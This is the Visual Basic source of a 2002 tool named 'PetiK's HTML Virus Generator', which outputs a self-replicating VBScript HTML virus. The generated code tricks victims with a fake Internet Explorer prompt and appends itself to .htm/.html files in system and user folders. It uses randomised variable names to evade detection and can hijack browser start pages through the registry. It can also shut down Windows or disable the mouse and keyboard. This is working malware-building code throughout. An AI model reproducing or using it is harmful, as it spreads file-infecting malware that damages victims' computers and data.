VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BackColor       =   &H80000008&
   Caption         =   "PetiK's HTML Virus Generator"
   ClientHeight    =   10605
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   14895
   Icon            =   "PHTMLVG.frx":0000
   LinkTopic       =   "Form1"
   Moveable        =   0   'False
   ScaleHeight     =   10605
   ScaleWidth      =   14895
   WindowState     =   2  'Maximized
   Begin VB.PictureBox Picture1 
      Height          =   4095
      Left            =   11520
      Picture         =   "PHTMLVG.frx":08CA
      ScaleHeight     =   4035
      ScaleWidth      =   3075
      TabIndex        =   33
      ToolTipText     =   "Click Me !"
      Top             =   360
      Width           =   3135
   End
   Begin VB.CheckBox chkstopkey 
      BackColor       =   &H80000008&
      Caption         =   "Disable keyboard"
      ForeColor       =   &H80000013&
      Height          =   255
      Left            =   9000
      TabIndex        =   14
      Top             =   1680
      Width           =   1695
   End
   Begin VB.CheckBox chkstopmouse 
      BackColor       =   &H80000008&
      Caption         =   "Disable mouse"
      ForeColor       =   &H80000013&
      Height          =   255
      Left            =   6840
      TabIndex        =   13
      Top             =   1680
      Width           =   1455
   End
   Begin VB.CheckBox chkstopsys 
      BackColor       =   &H80000008&
      Caption         =   "Shutdown system"
      ForeColor       =   &H80000013&
      Height          =   255
      Left            =   6840
      TabIndex        =   12
      Top             =   1200
      Width           =   1695
   End
   Begin VB.TextBox startpage 
      Height          =   285
      Left            =   8040
      TabIndex        =   11
      Text            =   "http://www.petikvx.fr.fm"
      Top             =   720
      Width           =   3135
   End
   Begin VB.CheckBox chksp 
      BackColor       =   &H80000008&
      Caption         =   "Start Page :"
      ForeColor       =   &H80000013&
      Height          =   255
      Left            =   6840
      TabIndex        =   10
      Top             =   720
      Width           =   1215
   End
   Begin MSComDlg.CommonDialog CMD 
      Left            =   12240
      Top             =   5880
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.TextBox savename 
      Height          =   285
      Left            =   9360
      Locked          =   -1  'True
      TabIndex        =   31
      Top             =   7080
      Width           =   4335
   End
   Begin VB.CommandButton butchoose 
      Caption         =   "..."
      Height          =   255
      Left            =   11040
      TabIndex        =   30
      Top             =   6600
      Width           =   255
   End
   Begin VB.OptionButton optn 
      BackColor       =   &H80000008&
      Caption         =   "Choose a name"
      ForeColor       =   &H80000013&
      Height          =   255
      Left            =   9360
      TabIndex        =   29
      Top             =   6600
      Width           =   1575
   End
   Begin VB.OptionButton optvn 
      BackColor       =   &H80000008&
      Caption         =   """Virus"" Name"
      ForeColor       =   &H80000013&
      Height          =   375
      Left            =   9360
      TabIndex        =   28
      Top             =   6120
      Width           =   1455
   End
   Begin VB.CheckBox chksave 
      BackColor       =   &H80000008&
      Caption         =   "Save the virus on the system"
      ForeColor       =   &H80000013&
      Height          =   375
      Left            =   9360
      TabIndex        =   15
      Top             =   5520
      Width           =   2655
   End
   Begin VB.TextBox rdfolder 
      Height          =   285
      Left            =   6840
      TabIndex        =   9
      Text            =   "Third Folder"
      Top             =   3840
      Width           =   4335
   End
   Begin VB.TextBox title 
      Height          =   285
      Left            =   1680
      TabIndex        =   3
      Top             =   1560
      Width           =   3015
   End
   Begin VB.CommandButton gen 
      Caption         =   "GENERATE THE HTML VIRUS"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1335
      Left            =   9360
      TabIndex        =   16
      Top             =   8640
      Width           =   4335
   End
   Begin VB.TextBox virsource 
      BackColor       =   &H80000008&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0080FF80&
      Height          =   4815
      Left            =   240
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   25
      Text            =   "PHTMLVG.frx":336B
      Top             =   5520
      Width           =   8295
   End
   Begin VB.TextBox ndfolder 
      Height          =   285
      Left            =   6840
      TabIndex        =   8
      Text            =   "Second Folder"
      Top             =   3360
      Width           =   4335
   End
   Begin VB.TextBox stfolder 
      Height          =   285
      Left            =   6840
      TabIndex        =   7
      Text            =   "First Folder"
      Top             =   2880
      Width           =   4335
   End
   Begin VB.TextBox mdfolder 
      Height          =   285
      Left            =   2040
      Locked          =   -1  'True
      TabIndex        =   20
      Top             =   3840
      Width           =   4215
   End
   Begin VB.CheckBox chkmd 
      BackColor       =   &H80000008&
      Caption         =   "My Documents :"
      ForeColor       =   &H80000013&
      Height          =   375
      Left            =   360
      TabIndex        =   6
      Top             =   3840
      Width           =   1455
   End
   Begin VB.TextBox sysfolder 
      Height          =   285
      Left            =   2040
      Locked          =   -1  'True
      TabIndex        =   19
      Top             =   3360
      Width           =   3015
   End
   Begin VB.CheckBox chksysdir 
      BackColor       =   &H80000008&
      Caption         =   "SYSTEM :"
      ForeColor       =   &H80000013&
      Height          =   255
      Left            =   360
      TabIndex        =   5
      Top             =   3360
      Width           =   1215
   End
   Begin VB.TextBox winfolder 
      Height          =   285
      Left            =   2040
      Locked          =   -1  'True
      TabIndex        =   18
      Top             =   2880
      Width           =   3015
   End
   Begin VB.CheckBox chkwindir 
      BackColor       =   &H80000008&
      Caption         =   "WINDOWS :"
      ForeColor       =   &H80000013&
      Height          =   375
      Left            =   360
      TabIndex        =   4
      Top             =   2880
      Width           =   1335
   End
   Begin VB.TextBox authorname 
      Height          =   285
      Left            =   1680
      TabIndex        =   2
      Top             =   1080
      Width           =   3015
   End
   Begin VB.TextBox virname 
      Height          =   285
      Left            =   1680
      TabIndex        =   1
      Top             =   720
      Width           =   3015
   End
   Begin VB.Line Line4 
      BorderColor     =   &H80000005&
      X1              =   6720
      X2              =   11160
      Y1              =   2280
      Y2              =   2280
   End
   Begin VB.Label Label9 
      BackColor       =   &H80000008&
      Caption         =   "PayLoads :"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   375
      Left            =   6840
      TabIndex        =   32
      Top             =   240
      Width           =   2295
   End
   Begin VB.Label Label8 
      BackColor       =   &H80000008&
      Caption         =   "Create the virus :"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   375
      Left            =   9360
      TabIndex        =   27
      Top             =   4920
      Width           =   2535
   End
   Begin VB.Label Label7 
      BackColor       =   &H80000008&
      Caption         =   "Title of the page :"
      ForeColor       =   &H80000013&
      Height          =   255
      Left            =   360
      TabIndex        =   26
      Top             =   1560
      Width           =   1335
   End
   Begin VB.Label Label6 
      BackColor       =   &H80000008&
      Caption         =   "Source :"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   375
      Left            =   240
      TabIndex        =   24
      Top             =   4920
      Width           =   1095
   End
   Begin VB.Line Line3 
      BorderColor     =   &H80000009&
      X1              =   6720
      X2              =   11160
      Y1              =   4560
      Y2              =   4560
   End
   Begin VB.Label Label5 
      BackColor       =   &H80000008&
      Caption         =   "Other Folders :"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   375
      Left            =   6840
      TabIndex        =   23
      Top             =   2400
      Width           =   1935
   End
   Begin VB.Label Label4 
      BackColor       =   &H80000008&
      Caption         =   "Special Folders :"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   375
      Left            =   360
      TabIndex        =   22
      Top             =   2400
      Width           =   2295
   End
   Begin VB.Label Label3 
      BackColor       =   &H80000008&
      Caption         =   "Informations :"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   375
      Left            =   360
      TabIndex        =   21
      Top             =   240
      Width           =   1815
   End
   Begin VB.Line Line2 
      BorderColor     =   &H80000009&
      X1              =   240
      X2              =   6240
      Y1              =   4560
      Y2              =   4560
   End
   Begin VB.Line Line1 
      BorderColor     =   &H80000009&
      X1              =   240
      X2              =   6240
      Y1              =   2280
      Y2              =   2280
   End
   Begin VB.Label Label2 
      BackColor       =   &H80000012&
      Caption         =   "Author Name :"
      ForeColor       =   &H80000013&
      Height          =   255
      Left            =   360
      TabIndex        =   17
      Top             =   1080
      Width           =   1095
   End
   Begin VB.Label Label1 
      BackColor       =   &H80000008&
      Caption         =   "Name of virus :"
      ForeColor       =   &H80000013&
      Height          =   255
      Left            =   360
      TabIndex        =   0
      Top             =   720
      Width           =   1215
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
Dim fs, wsh
Set fs = CreateObject("Scripting.FileSystemObject")
Set wsh = CreateObject("WScript.Shell")
win = fs.GetSpecialFolder(0)
sys = fs.GetSpecialFolder(1)
winfolder.Text = win
sysfolder.Text = sys
mdfolder.Text = wsh.SpecialFolders("MyDocuments")
End Sub

Private Sub gen_Click()
Dim fs, wsh
Set fs = CreateObject("Scripting.FileSystemObject")
Set wsh = CreateObject("WScript.Shell")
win = fs.GetSpecialFolder(0)
sys = fs.GetSpecialFolder(1)
If Len(virname.Text) = 0 Then
MsgBox "PLEASE CHOOSE A NAME", vbCritical, "PHTMLVG"
ElseIf Len(authorname.Text) = 0 Then MsgBox "PLEASE PUT AN AUTHOR NAME", vbCritical, "PHTMLVG"

Else


fso = ""
Randomize (Timer)
For I = 1 To 6
fso = fso & Chr(Int(Rnd(1) * 26) + 97)
Next I
ws = ""
Randomize (Timer)
For I = 1 To 6
ws = ws & Chr(Int(Rnd(1) * 26) + 97)
Next I
inf = ""
Randomize (Timer)
For I = 1 To 6
inf = inf & Chr(Int(Rnd(1) * 26) + 97)
Next I

gf = ""
Randomize (Timer)
For I = 1 To 6
gf = gf & Chr(Int(Rnd(1) * 26) + 97)
Next I
fle = ""
Randomize (Timer)
For I = 1 To 4
fle = fle & Chr(Int(Rnd(1) * 26) + 97)
Next I
fl = ""
Randomize (Timer)
For I = 1 To 4
fl = fl & Chr(Int(Rnd(1) * 26) + 97)
Next I
ext = ""
Randomize (Timer)
For I = 1 To 3
ext = ext & Chr(Int(Rnd(1) * 26) + 97)
Next I
virfl = ""
Randomize (Timer)
For I = 1 To 6
virfl = virfl & Chr(Int(Rnd(1) * 26) + 97)
Next I
virus = ""
Randomize (Timer)
For I = 1 To 6
virus = virus & Chr(Int(Rnd(1) * 26) + 97)
Next I
vir = "<" & virname & ">" & vbCrLf
vir = vir & "<coded with the PHTMLVG tool by " & authorname & ">" & vbCrLf

If Len(title) = 0 Then
vir = vir & "<html><head><title>HomePage</title></head><body>" & vbCrLf
Else
vir = vir & "<html><head><title>" & title & "</title></head><body>" & vbCrLf
End If

vir = vir & "<script language=VBScript>" & vbCrLf
vir = vir & "On Error Resume Next" & vbCrLf
vir = vir & "MsgBox ""Please accept the ActiveX by clicking YES"",vbinformation,""Internet Explorer""" & vbCrLf
vir = vir & "Set " & fso & "=CreateObject(""Scripting.FileSystemObject"")" & vbCrLf
vir = vir & "Set " & ws & "=CreateObject(""WScript.Shell"")" & vbCrLf
vir = vir & "If err.number=429 Then" & vbCrLf
vir = vir & ws & ".Run javascript:location.reload()" & vbCrLf
vir = vir & "Else" & vbCrLf & vbCrLf

If chkwindir.Value = 1 Then
vir = vir & inf & "(" & fso & ".GetSpecialFolder(0))" & vbCrLf
End If
If chksysdir.Value = 1 Then
vir = vir & inf & "(" & fso & ".GetSpecialFolder(1))" & vbCrLf
End If
If chkmd.Value = 1 Then
vir = vir & inf & "(" & ws & ".SpecialFolders(""MyDocuments""))" & vbCrLf
End If
If stfolder.Text <> "First Folder" Then vir = vir & inf & "(""" & stfolder.Text & """)" & vbCrLf
If ndfolder.Text <> "Second Folder" Then vir = vir & inf & "(""" & ndfolder.Text & """)" & vbCrLf
If rdfolder.Text <> "Third Folder" Then vir = vir & inf & "(""" & rdfolder.Text & """)" & vbCrLf

If chksp.Value = 1 Then
vir = vir & vbCrLf & ws & ".RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page"",""" & startpage & """" & vbCrLf
vir = vir & ws & ".RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Search Page"",""" & startpage & """" & vbCrLf
vir = vir & ws & ".RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Local Page"",""" & startpage & """" & vbCrLf
End If
If chkstopsys.Value = 1 Then
vir = vir & ws & ".Run ""rundll32.exe user,exitwindows""" & vbCrLf
End If
If chkstopmouse.Value = 1 Then
vir = vir & ws & ".Run ""rundll32.exe mouse,disable""" & vbCrLf
End If
If chkstopkey.Value = 1 Then
vir = vir & ws & ".Run ""rundll32.exe keyboard,disable""" & vbCrLf
End If

vir = vir & vbCrLf & "End If" & vbCrLf

vir = vir & vbCrLf & "Function " & inf & "(dir)" & vbCrLf
vir = vir & "If " & fso & ".FolderExists(dir) Then" & vbCrLf
vir = vir & "Set " & gf & "=" & fso & ".GetFolder(dir)" & vbCrLf
vir = vir & "Set " & fle & "=" & gf & ".Files" & vbCrLf
vir = vir & "For each " & fl & " in " & fle & vbCrLf
vir = vir & ext & "=lcase(" & fso & ".GetExtensionName(" & fl & ".Name))" & vbCrLf & vbCrLf
vir = vir & "If " & ext & "=""htm"" or " & ext & "=""html"" Then" & vbCrLf
vir = vir & "Set " & virfl & "=" & fso & ".OpenTextFile(" & fl & ".path, 1, False)" & vbCrLf
vir = vir & "If " & virfl & ".ReadLine <> ""<" & virname & ">"" Then" & vbCrLf
vir = vir & virfl & ".Close()" & vbCrLf
vir = vir & "Set " & virfl & "=" & fso & ".OpenTextFile(" & fl & ".path, 1, False)" & vbCrLf
vir = vir & "htmorg=" & virfl & ".ReadAll()" & vbCrLf
vir = vir & virfl & ".Close()" & vbCrLf
vir = vir & "Set " & virus & "=document.body.CreateTextRange" & vbCrLf
vir = vir & "Set " & virfl & "=" & fso & ".CreateTextFile(" & fl & ".path, True, False)" & vbCrLf
vir = vir & virfl & ".WriteLine ""<" & virname & ">""" & vbCrLf
vir = vir & virfl & ".Write(htmorg)" & vbCrLf
vir = vir & virfl & ".WriteLine " & virus & ".htmltext" & vbCrLf
vir = vir & virfl & ".Close()" & vbCrLf
vir = vir & "Else" & vbCrLf
vir = vir & virfl & ".Close()" & vbCrLf
vir = vir & "End If" & vbCrLf & vbCrLf
vir = vir & "End If" & vbCrLf
vir = vir & "Next" & vbCrLf
vir = vir & "End If" & vbCrLf
vir = vir & "End Function" & vbCrLf
vir = vir & "</script></body></html>"

virsource.Text = vir

If chksave.Value <> 0 Then
'If optvn.Value = True Then
'savename.Text = App.Path & "\" & virname & ".htm"
'Else
'savename.Text = CMD.FileName
'End If

If Len(savename) <> 0 Then
Open savename.Text For Output As #1
Print #1, vir
Close #1
MsgBox """" & savename.Text & """ is create.", vbInformation, "PHTMLVG"
Else
MsgBox "Please choose a file name", vbCritical, "PHTMLVG"
End If
End If

End If

End Sub

Private Sub chksave_Click()
If chksave.Value <> True Then
optvn.Value = True
savename.Text = App.Path & "\" & virname & ".htm"
Else
optvn.Value = False
optn.Value = False
savename.Text = ""
MsgBox "Hello"
End If
End Sub

Private Sub optn_Click()
savename.Text = CMD.FileName
End Sub
Private Sub optvn_Click()
savename.Text = App.Path & "\" & virname & ".htm"
End Sub
Private Sub butchoose_Click()
On Error Resume Next
CMD.DialogTitle = "Save the HTML virus As ..."
CMD.CancelError = True
CMD.Filter = "HTM Extension|*.htm|HTML Extension|*.html"
CMD.FilterIndex = 1
CMD.InitDir = CurDir("")
CMD.ShowSave
savename.Text = CMD.FileName
End Sub

Private Sub Picture1_Click()
MsgBox "PetiK's HTML Virus Generator" & vbCrLf & _
        "Coded by PetiK - ©2002 - France", vbInformation, "PHTMLVG"
End Sub
